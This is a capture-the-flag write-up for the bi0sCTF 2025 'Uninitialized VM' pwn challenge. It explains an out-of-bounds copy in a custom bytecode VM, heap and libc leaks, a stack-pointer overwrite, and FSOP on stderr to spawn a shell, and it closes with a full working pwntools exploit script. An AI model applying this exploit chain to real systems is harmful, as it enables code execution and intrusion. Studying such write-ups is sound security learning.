---
title: Uninitialized VM
date: 2025-06-08 00:00:00 +0200
categories: [writeups, bi0sCTF 2025]
tags: [ctf, pwn, vm]

description: Writeup of Uninitialized VM challenge from bi0sCTF 2025
media_subpath: /assets/uninitialized-vm/
---

## Challenge description
Just cooked up a simple VM, forgot to check for bugs tho.

Author: B4tMite

## Reversing binary
We receive a full packet of files - binary, libc, loader and Dockerfile.

We can check that our binary is 64-bit ELF with many security mitigations enabled. And the libc version is 2.41 (currently latest version).
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

After some time looking at and fixing decompiled code in IDA, we can see that it's a custom virtual machine that executes bytecode that we give it. Our virtual machine has 2 main components that are kept on heap - memory and state. The first 256 bytes in memory are reserved for our bytecode. 

There is also `expand` function that gets called when we go past bytecode memory with our execution. We can use it to restart bytecode memory by simply sending new payload (`expand` function will be also useful in later part of exploit).
![virtual machine setup](vmsetup-decompilation.png)

I made a state structure in IDA to help me understand how rest of the code works. It has instruction pointer, stack pointer, stack base and 8 general purpose registers r0-r7. Stack base is set to end of our heap chunk, and then stack "grows" downwards.
![state structure](state-struct.png)

The rest of the VM is just a loop with inner switch statement that decides what instruction is gonna be executed based on opcode.
![vm switch](vm-inner-switch.png)

## Writing bytecode assembler
First thing I did was writing a simple assembler for this custom bytecode, so I could focus on exploitation instead of writing bytes by hand. Here is a summary of what every instruction does

```
push 0xdf - push value 0xdf
push r0 - push value in register r0
pop r1 - pop to register r1
mov r2 r3 - move value from r3 to r2
mov r4 0x1122334455667788 - move value to register
cpy r1 r2 0x10 - copy 0x10 bytes from memory from index in r2 to index in r1
and r2 r3 - bitwise and, r2 = r2 & r3
or r2 r3 - bitwise or, r2 = r2 | r3
xor r2 r3 - bitwise xor, r2 = r2 ^ r3
not r4 - bitwise not, r4 = ~r4
shr r2 0x3 - bitwise right shift, r2 = r2 >> 3
shl r2 0x4 - bitwise left shift, r2 = r2 << 4
add r3 r4 - addition, r3 = r3 + r4
sub r3 r4 - subtraction, r3 = r3 - r4
jmp 0x30 - jump to absolute offset within buf
```

```py
def myasm(bytecode):
    result = b''
    for line in bytecode.split('\n'):
        if len(line) < 1:
            continue
        if '#' in line:
            continue

        parts = line.strip().split(' ')
        opcode = parts[0]
        match opcode:
            case 'push':
                if parts[1][0] == '0':
                    result += b'1'
                    result += p8(int(parts[1], 16))
                else:
                    result += b'2'
                    result += p8(int(parts[1][1]))
            case 'pop':
                result += b'3'
                result += p8(int(parts[1][1]))
            case 'mov':
                if parts[2][0] == 'r':
                    result += b'4'
                    result += p8(int(parts[1][1]))
                    result += p8(int(parts[2][1]))
                else:
                    result += b'5'
                    result += p8(int(parts[1][1]))
                    result += p64(int(parts[2], 16))
            case 'cpy':
                result += b'6'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
                result += p16(int(parts[3], 16))
            case 'and':
                result += b'7'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'or':
                result += b'8'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'xor':
                result += b'9'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'not':
                result += b'@'
                result += p8(int(parts[1][1]))
            case 'shr':
                result += b'A'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2], 16))
            case 'shl':
                result += b'B'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2], 16))
            case 'add':
                result += b'C'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'sub':
                result += b'D'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'jmp':
                result += b'E'
                result += p8(int(parts[2], 16))
    return result

def send_bytecode(code, len):
    io.sendlineafter(b'>>', str(len).encode())
    io.sendlineafter(b'>>', code)
```

## Getting leaks
Okay now that we know how program works and have assembler ready, how do we exploit it? The vulnerability I saw is out of bounds copy in `cpy` instruction. We can't use pointers outside of our memory, but the program doesn't check if pointer + size is out of bounds. We can use this to read heap chunks past our memory chunk. 

But what can we leak? Remember `expand` function from earlier? It allocates new chunks on heap, copies memory and state to new chunks and frees old chunks. Because memory chunk is big (0x900 bytes), when it is freed it lands in unsorted bin and contains pointer to `main_arena` in libc. 

If we send empty payload, the program will allocate next group of chunks after our current state chunk, copy data to new chunks and then free old ones. If we send second empty payload, program will do the same thing, but our initial chunks will be reused. 

```py
send_bytecode(b'', 0xff)
send_bytecode(b'', 0xff)
```

After these operations, the heap would look like this:
```
    +------------------+-----------+------------------+-----------+
    |     current      |  current  |    old           |   old     |
    |     memory       |  state    |    memory        |   state   |
    |                  |           |                  |           |
    +------------------+-----------+------------------+-----------+
heap base             -->
                direction of memcpy
```

As I said earlier, there is pointer to `main_arena` in old memory and there are pointers to heap in current state, which we can leak. Since there are no VM instructions that print data to user, we can't just copy pointers to VM memory and read them from script. What I did is copy these pointers to our program stack and then pop them into registers. Since we can manipulate (add, subtract) data in registers and we use registers to do everything in our VM, we can just use standard program functionality to handle leaks. 

Here is bytecode to get leaks into registers and calculate bases of memory regions (I ommited some details, you can find full solve script at the end):
```
    mov r0 0xe8
    mov r1 0xff

    # stack setup
    push r4
    push r4
    ...
    push r4

    cpy r0 r1 0x81

    pop r4
    pop r4
    ...
    pop r4

    # heap leak
    pop r6
    mov r4 0x30b
    sub r6 r4

    pop r4
    pop r4
    ...
    pop r4

    # libc leak
    pop r7
    mov r4 0x1e6b20
    sub r7 r4
```

## Getting arbitrary read and write
Now we have heap and libc bases in respectively r6 and r7, what do we do next? Since we can write out of bounds on heap using `cpy`, we can target `state` chunk, particularly stack pointer. If we overwrite stack pointer, we can use `pop` and `push` instructions to read and write data at arbitrary memory addresses. We can setup addresses on VM stack and then use `cpy` to OOB write. 

If we want to do arbitrary read, we must remember to set `stack_base` to address bigger than `sp` (because of this check `if ( program_state->stack_base >= program_state->sp )` in `pop` handler)  

What do we target? We could leak some stack pointers from libc and do classic ROP but it would require a lot of work. I decided to target stderr and do FSOP (it's probably the easiest way to get execution with modern libc). Here is bytecode to setup pointers:
```
    # setup stack base
    mov r4 r7
    mov r2 0x1f75af
    add r4 r2
    push r4

    # setup stack pointer
    mov r4 r7
    mov r2 0x1e75b8
    add r4 r2
    push r4
    
    # setup instruction pointer
    mov r4 r6
    mov r2 0x2a5
    add r4 r2
    push r4

    # setup chunk metadata
    mov r4 0x61
    push r4
    mov r4 0x0
    push r4
    
    mov r0 0xf1
    mov r1 0xff
```

## FSOP
I used this payload, which I learned from one of [poni's writeups](https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/16/Challenges-I-Wrote-For-BtS-CTF-2025.html)

```py
file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = libc.sym["_IO_2_1_stderr_"] - 0x10
file._wide_data = libc.sym["_IO_2_1_stderr_"] - 0x10
file._offset = 0
file._old_offset = 0
file.unknown2 = b"\x00"*24+ p32(1) + p32(0) + p64(0) + \
    p64(libc.sym["_IO_2_1_stderr_"] - 0x10) + \
    p64(libc.sym["_IO_wfile_jumps"] + 0x18 - 0x58)
```

Since our VM stack "grows" downwards, we have to write payload in reverse. We also can't just calculate addresses in script (because they are in VM registers), so I calculated them manually and hardcoded offsets in bytecode.
```
    cpy r1 r0 0x31

    # r2 = stderr - 0x10
    mov r2 r7
    mov r4 0x1e74d0
    add r2 r4

    # r1 = wfile_jumps + 0x18 - 0x58
    mov r1 r7
    mov r4 0x1e51a8
    add r1 r4

    # r0 = system
    mov r0 r7
    mov r4 0x53400
    add r0 r4

    # r3 = 0xfbad101;sh
    mov r3 0x68733bfbad0101

    # r4 = 0x1
    mov r4 0x1

    # r5 = 0x0
    mov r5 0x0

    push r1
    push r2
    push r5
    push r4
    push r5
    push r5
    push r5
    push r2
    push r5
    push r5
    push r2
    push r5
    push r5
    push r5
    push r5
    push r5
    push r0
    push r5
    push r5
    push r5
    push r5
    push r5
    push r5
    push r5
    push r5
    push r5
    push r5
    push r3
```

Now we have to trigger our FSOP, so we need to exit from the program gracefully. To do this we can just send more data than the size we give.

```py
send_bytecode(b'AAAAAAAAAAAAAAAA', 5)
```

We get a shell and can read flag - **bi0sctf{1ni7ia1i53_Cr4p70_pWn_N3x7_5$67?!@&86}**.

## Final exploit

```py
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('./vm_chall_patched')
libc = elf.libc

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'uninitialized_vm.eng.run'
        PORT = 8025         
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
b *expand
# b *main+1089
b *main+1283
# b *main+535
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def myasm(bytecode):
    result = b''
    for line in bytecode.split('\n'):
        if len(line) < 1:
            continue
        if '#' in line:
            continue

        parts = line.strip().split(' ')
        opcode = parts[0]
        match opcode:
            case 'push':
                if parts[1][0] == '0':
                    result += b'1'
                    result += p8(int(parts[1], 16))
                else:
                    result += b'2'
                    result += p8(int(parts[1][1]))
            case 'pop':
                result += b'3'
                result += p8(int(parts[1][1]))
            case 'mov':
                if parts[2][0] == 'r':
                    result += b'4'
                    result += p8(int(parts[1][1]))
                    result += p8(int(parts[2][1]))
                else:
                    result += b'5'
                    result += p8(int(parts[1][1]))
                    result += p64(int(parts[2], 16))
            case 'cpy':
                result += b'6'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
                result += p16(int(parts[3], 16))
            case 'and':
                result += b'7'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'or':
                result += b'8'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'xor':
                result += b'9'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'not':
                result += b'@'
                result += p8(int(parts[1][1]))
            case 'shr':
                result += b'A'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2], 16))
            case 'shl':
                result += b'B'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2], 16))
            case 'add':
                result += b'C'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'sub':
                result += b'D'
                result += p8(int(parts[1][1]))
                result += p8(int(parts[2][1]))
            case 'jmp':
                result += b'E'
                result += p8(int(parts[2], 16))

    return result

def send_bytecode(code, len):
    io.sendlineafter(b'>>', str(len).encode())
    io.sendlineafter(b'>>', code)

io = start()

send_bytecode(b'', 0xff)
send_bytecode(b'', 0xff)

bytecode = """
    mov r0 0xe8
    mov r1 0xff

    # stack setup
    mov r4 0x4141414141414141
    push r4
    mov r4 0x4343434343434343
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    push r4
    mov r4 0x4242424242424242
    push r4

    cpy r0 r1 0x81

    pop r4
    pop r4
    pop r4
    pop r4
    pop r4

    # heap leak
    pop r6
    mov r4 0x30b
    sub r6 r4

    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4
    pop r4

    # libc leak
    pop r7
    mov r4 0x1e6b20
    sub r7 r4
"""
send_bytecode(myasm(bytecode), 0xff)

bytecode2 = """
    mov r1 0x4444444444444444
    push r1

    # stack base
    mov r4 r7
                # more than sp
    mov r2 0x1f75af
    add r4 r2
    push r4

    # sp ptr
    mov r4 r7
                # stderr
    mov r2 0x1e75b8
    add r4 r2
    push r4
    
    # ip ptr
    mov r4 r6
    mov r2 0x2a5
    add r4 r2
    push r4

    # chunk size
    mov r4 0x61
    push r4
    
    # prev chunk size
    mov r4 0x0
    push r4

    push r1
    
    mov r0 0xf1
    mov r1 0xff
"""
send_bytecode(myasm(bytecode2), 0xff)

bytecode3 = """
    cpy r1 r0 0x31

        # r2 = stderr - 0x10
    mov r2 r7
    mov r4 0x1e74d0
    add r2 r4

        # r1 = wfile_jumps + 0x18 - 0x58
    mov r1 r7
    mov r4 0x1e51a8
    add r1 r4

        # r0 = system
    mov r0 r7
    mov r4 0x53400
    add r0 r4

        # r3 = 0xfbad101 + sh
    mov r3 0x68733bfbad0101

        # r4 = 0x1
    mov r4 0x1

        # r5 = 0x0
    mov r5 0x0

    push r1
    push r2
    push r5
    push r4

    push r5
    push r5
    push r5
    push r2

    push r5
    push r5
    push r2
    push r5

    push r5
    push r5
    push r5
    push r5

    push r0
    push r5
    push r5
    push r5

    push r5
    push r5
    push r5
    push r5

    push r5
    push r5
    push r5
    push r3
"""
send_bytecode(myasm(bytecode3), 0xb0)
print(len(myasm(bytecode3)))

send_bytecode(b'AAAAAAAAAAAAAAAA', 5)

io.interactive()
```
